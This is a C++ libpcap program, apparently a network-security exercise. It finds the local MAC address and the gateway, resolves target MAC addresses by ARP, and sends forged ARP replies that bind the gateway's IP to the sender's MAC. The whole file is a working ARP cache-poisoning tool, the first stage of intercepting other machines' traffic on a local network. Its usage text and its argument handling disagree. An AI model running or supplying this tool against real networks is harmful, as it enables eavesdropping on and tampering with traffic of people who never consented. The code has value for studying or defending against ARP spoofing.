#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

void usage() {
        printf("syntax: send-arp-test <interface>\n");
        printf("sample: send-arp-test wlan0\n");
}

Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip get_gateway_ip(const char* dev) {
    FILE* fp = fopen("/proc/net/route", "r");
    if (!fp) {
        perror("Failed to open /proc/net/route");
        return Ip("0.0.0.0");
    }

    char line[256];
    char iface[16];
    unsigned long dest, gateway;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%15s %lx %lx", iface, &dest, &gateway) == 3) {
            if (strcmp(iface, dev) == 0 && dest == 0) {
                fclose(fp);
                return Ip(ntohl(gateway));
            }
        }
    }

    fclose(fp);
    return Ip("0.0.0.0");
}

Mac get_sender_mac(pcap_t* handle, Ip sender_ip, Mac my_mac, Ip my_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac("00:00:00:00:00:00");
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* eth_arp = (EthArpPacket*)packet;
        if (eth_arp->eth_.type_ == htons(EthHdr::Arp) &&
            eth_arp->arp_.op_ == htons(ArpHdr::Reply) &&
            Ip(ntohl(eth_arp->arp_.sip_)) == sender_ip) {
            return eth_arp->arp_.smac_;
        }
    }

    return Mac("00:00:00:00:00:00");
}

void send_arp_spoof(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip, Ip gateway_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = sender_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = sender_mac;
    packet.arp_.sip_ = htonl(gateway_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //2024-08-14 21:47 modified
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac my_mac = get_my_mac(dev);
    printf("My MAC: %s\n", std::string(my_mac).c_str());

    Ip gateway_ip = get_gateway_ip(dev);
    printf("Gateway IP: %s\n", std::string(gateway_ip).c_str());

    Mac gateway_mac = get_sender_mac(handle, gateway_ip, my_mac, Ip(argv[2]));
    if (gateway_mac == Mac("00:00:00:00:00:00")) {
        fprintf(stderr, "Failed to get MAC address for gateway %s\n", std::string(gateway_ip).c_str());
        pcap_close(handle);
        return -1;
    }
    printf("Gateway MAC: %s\n", std::string(gateway_mac).c_str());

    std::vector<std::pair<Ip, Ip>> ip_pairs;
    for (int i = 2; i < argc; i += 2) {
        ip_pairs.push_back({Ip(argv[i]), Ip(argv[i+1])});
    }

    for (const auto& pair : ip_pairs) {
        Ip sender_ip = pair.first;
        Ip target_ip = pair.second;

        Mac target_mac = get_sender_mac(handle, target_ip, my_mac, sender_ip);
        if (target_mac == Mac("00:00:00:00:00:00")) {
            fprintf(stderr, "Failed to get MAC address for %s\n", std::string(target_ip).c_str());
            continue;
        }

        printf("target IP: %s, MAC: %s\n", std::string(target_ip).c_str(), std::string(target_mac).c_str());

        send_arp_spoof(handle, my_mac, sender_ip, target_mac, target_ip, gateway_ip);
        printf("Sent ARP spoofing packet to %s\n", std::string(target_ip).c_str());
    }

    pcap_close(handle);
    return 0;
}
